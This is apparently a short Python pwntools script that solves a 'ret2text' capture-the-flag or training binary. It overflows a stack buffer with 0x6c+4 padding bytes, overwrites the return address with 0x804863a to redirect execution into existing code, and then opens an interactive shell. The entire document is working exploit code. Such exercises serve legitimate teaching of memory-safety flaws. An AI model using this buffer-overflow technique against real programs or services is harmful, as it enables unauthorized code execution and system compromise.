##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')

# pwnlib.gdb.attach(proc.pidof(sh)[0])

target = 0x804863a
sh.sendline(b'A' * (0x6c + 4) + p32(target))
sh.interactive()